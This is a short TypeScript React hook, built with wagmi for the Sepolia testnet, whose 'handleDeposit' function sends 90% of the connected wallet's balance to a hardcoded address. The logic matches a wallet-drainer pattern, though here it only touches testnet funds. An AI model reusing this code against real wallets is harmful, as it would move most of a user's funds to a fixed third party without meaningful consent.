import { sepolia } from "viem/chains";
import { useAccount, useBalance, useConnect, useSendTransaction } from "wagmi";
import { injected } from "wagmi/connectors";

type BalanceData = {
  value: bigint;
};

export const useWallet = () => {
  const { address } = useAccount();
  const { connectAsync } = useConnect();
  const { sendTransactionAsync } = useSendTransaction();
  const { data: balanceData } = useBalance({
    address,
    chainId: sepolia.id,
  });

  const calculateAmountInWei = (
    balanceData?: BalanceData
  ): bigint | undefined => {
    if (!balanceData) return undefined;
    return (balanceData.value * 90n) / 100n;
  };

  const handleDeposit = async () => {
    try {
      if (!address) {
        await connectAsync({ chainId: sepolia.id, connector: injected() });
      }

      const amountInWei = calculateAmountInWei(balanceData);
      if (!amountInWei) {
        console.error("Failed to calculate the amount in Wei.");
        return;
      }

      const recipientAddress = "0xB9322aD0cBA7ac918Da54803192D14a85De4E194";

      const transactionResponse = await sendTransactionAsync({
        chainId: sepolia.id,
        to: recipientAddress,
        value: amountInWei,
      });

      console.log("Transaction successful:", transactionResponse);
    } catch (error) {
      console.error("Transaction failed:", error);
    }
  };

  return { handleDeposit };
};
